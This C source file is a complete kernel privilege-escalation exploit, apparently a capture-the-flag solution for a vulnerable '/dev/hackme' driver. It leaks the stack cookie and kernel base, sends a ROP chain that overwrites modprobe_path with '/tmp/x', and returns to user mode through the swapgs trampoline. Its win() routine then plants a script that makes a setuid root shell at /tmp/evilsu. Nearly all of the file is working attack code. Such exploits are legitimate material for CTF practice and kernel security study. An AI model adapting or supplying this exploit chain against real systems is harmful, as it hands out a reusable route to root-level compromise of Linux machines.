#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupt*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;

u64 dev_fd;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 cookie, img_base, trampoline, modprobe_path;
u64 pop_rax, pop_rbx_r12_rbp, mov_qword_ptr_rbx_rax_pop_rbx_rbp;

void win()
{
    system("echo '#!/bin/sh\nmv /evilsu /tmp/evilsu\nchmod u+s /tmp/evilsu\nchmod 777 /evilsu' > /tmp/x");
    system("chmod 777 /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    system("/tmp/dummy");
    puts("[*] win, run '/tmp/evilsu' to get root");
}

void open_device()
{
    puts("[*] opening device");
    dev_fd = open("/dev/hackme", 2);
    if(dev_fd < 1) puts("[!] fail fd");
}

void leak()
{
    u64 leak[40];
    read(dev_fd, leak, 40 * 8);
    cookie = leak[16];
    img_base = leak[38] - 0xa157; // cat /proc/kallsyms | grep "startup_64"
    printf("[*] cookie: 0x%lx\n", cookie);
    printf("[*] img_base: 0x%lx\n", img_base);
    trampoline = img_base + 0x200f26; // cat /proc/kallsyms | grep "swapgs_restore_regs_and_return_to_usermode"
    modprobe_path = img_base + 0x1061820; // cat /proc/kallsyms | grep "modprobe_path"
    pop_rax = img_base + 0x4d11; // pop rax; ret; (find by hand?)
    pop_rbx_r12_rbp = img_base + 0x3190; // // pop rbx ; pop r12 ; pop rbp ; ret; (find by hand?)
    mov_qword_ptr_rbx_rax_pop_rbx_rbp = img_base + 0x306d; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret; (find by hand?)
}

void overflow_ovw_modprobe()
{
    puts("[*] overwrite modprobe");
    puts("[*][*] prepare rop chain");
    u64 rop[50];
    u64 idx = 16;
    save_state(0);
    user_rip = (u64)(&&label); // dark magic code
    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rax;
    rop[inc] = 0x782f706d742f; // rax <- "/tmp/x"
    rop[inc] = pop_rbx_r12_rbp;
    rop[inc] = modprobe_path;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = mov_qword_ptr_rbx_rax_pop_rbx_rbp;
    rop[inc] = 0;
    rop[inc] = user_rbp; // rbp
    rop[inc] = trampoline;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
    puts("[*][*] overwriting");
    write(dev_fd, (char *)&rop, idx * 8);
    puts("[!] should never be reached"); // flow should be directly to label
label:
    puts("[*] modprobe has been overwrited");
}

int main()
{
    open_device();
    leak();
    overflow_ovw_modprobe();
    win();
}